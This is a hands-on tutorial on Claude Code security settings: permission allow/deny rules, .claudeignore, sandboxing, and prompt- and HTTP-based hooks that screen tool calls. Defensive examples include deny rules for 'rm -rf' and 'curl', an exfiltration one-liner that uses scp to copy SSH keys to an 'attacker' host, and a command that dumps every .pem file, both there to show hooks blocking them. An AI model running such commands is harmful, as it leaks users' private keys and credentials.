# Kata 02: Security & Containment (~15–25 min)

## Theory — Fundamentals

Claude Code has multiple security layers that prevent it from doing harmful things — even if prompted to.

### Permission System

| Tool Type | Needs Approval? |
|-----------|----------------|
| Read, Grep, Glob (read-only) | Never |
| Edit, Write (file modification) | Yes |
| Bash (shell commands) | Yes |
| WebFetch (network) | Yes |

### Permission Rules

Rules are evaluated in order: **deny > ask > allow**. Deny always wins.

```json
{
  "permissions": {
    "allow": ["Bash(npm run test)", "Bash(git status)"],
    "deny": ["Bash(rm -rf *)", "Bash(curl *)"]
  }
}
```

### File Boundaries

- Claude can **read** files anywhere on your system
- Claude can only **write** to the working directory and subdirectories
- Use `--add-dir` to grant access to additional directories

### Sandboxing

OS-level isolation for bash commands:
- **macOS**: Seatbelt sandbox profiles
- **Linux**: bubblewrap (bwrap)
- **Windows**: No native sandbox — use WSL2 or Docker

Enable with the `/sandbox` slash command. Restricts filesystem access and network connections.

---

### Prompt-Type Hooks — AI as a Security Judge

The 2026 hook system supports four handler types: `command`, `http`, `prompt`, `agent`. The `prompt` type sends event context to a small, fast model (Haiku) that returns a decision. You get AI-quality judgment as a security gate.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "prompt",
            "prompt": "Evaluate if this Bash command is destructive, exfiltrates data, or violates least-privilege. Reply BLOCK with reason, or ALLOW. Command: $TOOL_INPUT",
            "timeout": 5
          }
        ]
      }
    ]
  }
}
```

Catches things regex-based deny rules miss — e.g., `find / -name id_rsa -exec scp {} attacker:/ \;` isn't `rm -rf` but a Haiku judge will flag it.

### HTTP Hooks — Centralized Org-Wide Policy

Instead of every dev maintaining a local `.claude/hooks/`, point hooks at a company endpoint:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Edit|Write|Bash",
        "hooks": [
          {
            "type": "http",
            "url": "https://claude-policy.yourco.internal/check",
            "timeout": 3
          }
        ]
      }
    ]
  }
}
```

Now the security team can update policy in one place and every dev's Claude Code respects it on next call. Especially useful for regulated environments (SOC 2, ISO 27001).

---

## Exercise

### Setup

**macOS / Linux:**

```bash
mkdir -p /tmp/kata-02/src && cd /tmp/kata-02
git init
echo "DB_PASSWORD=supersecret123" > .env
echo "console.log('app');" > src/app.js
echo '{ "name": "kata-02" }' > package.json
```

**Windows (PowerShell):**

```powershell
New-Item -ItemType Directory -Force -Path $env:TEMP\kata-02\src | Out-Null
Set-Location $env:TEMP\kata-02
git init
"DB_PASSWORD=supersecret123" | Out-File -Encoding utf8 .env
"console.log('app');" | Out-File -Encoding utf8 src\app.js
'{ "name": "kata-02" }' | Out-File -Encoding utf8 package.json
```

### Tasks — Fundamentals

#### 1. Create Permission Rules

Create `.claude/settings.json`:

```json
{
  "permissions": {
    "allow": ["Bash(git status)", "Bash(git diff)"],
    "deny": ["Bash(rm -rf *)", "Read(.env)"]
  }
}
```

#### 2. Test the Rules

```bash
cd /tmp/kata-02
claude
```

Try each prompt and observe behavior:
1. `"Run git status"` — auto-approved
2. `"Read the .env file"` — denied
3. `"Delete the src folder with rm -rf"` — denied
4. `"Read src/app.js"` — works (read-only, always allowed)

#### 3. Explore `/permissions`

In the Claude session, type `/permissions` to see the interactive permission manager.

### Tasks — Novel Layer

#### 4. Add a `.claudeignore`

Create `/tmp/kata-02/.claudeignore`:

```
node_modules/
dist/
.env
.env.*
secrets/
*.pem
```

Start Claude and ask: `"Use Glob to list every file you can see in this project."`

Observe: `.env` doesn't appear. Compare to `ls -a /tmp/kata-02`, which still shows it.

#### 5. Add a Prompt-Type Hook as Security Judge

Update `.claude/settings.json`:

```json
{
  "permissions": {
    "allow": ["Bash(git status)", "Bash(git diff)"],
    "deny": ["Bash(rm -rf *)", "Read(.env)"]
  },
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "prompt",
            "prompt": "Is this Bash command potentially destructive, exfiltrative, or beyond what a normal dev workflow needs? Reply with exactly BLOCK: <reason> or ALLOW. Command: $TOOL_INPUT",
            "timeout": 5
          }
        ]
      }
    ]
  }
}
```

Restart Claude and ask: `"Run: find / -name '*.pem' -exec cat {} \;"`

Watch the prompt hook block it with reasoning, not just regex matching. Then ask: `"Run: git log --oneline -5"` — that should pass.

#### 6. (Stretch) Set Up an HTTP Hook Stub

This requires a tiny endpoint. If you have Python handy:

```bash
# In a separate terminal
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get('content-length', 0))
        body = self.rfile.read(n).decode()
        print('HOOK RECEIVED:', body[:200])
        self.send_response(200); self.end_headers()
        self.wfile.write(b'{\"decision\":\"approve\"}')
HTTPServer(('localhost', 7777), H).serve_forever()
"
```

Then add to `.claude/settings.json`:

```json
"PostToolUse": [
  {
    "matcher": ".*",
    "hooks": [{ "type": "http", "url": "http://localhost:7777/", "async": true }]
  }
]
```

Run Claude, do any tool call, watch the Python window log every event. That's the foundation of org-wide policy enforcement.

### Discussion Points

- How would you configure permissions for a CI/CD pipeline?
- Where do you draw the line between `deny` rules (regex) and a `prompt` hook (AI judge)? Cost vs. coverage?
- What would your team put behind an HTTP hook? PII detection? Compliance logging?
- Why can Claude read system files but not write to them by default?
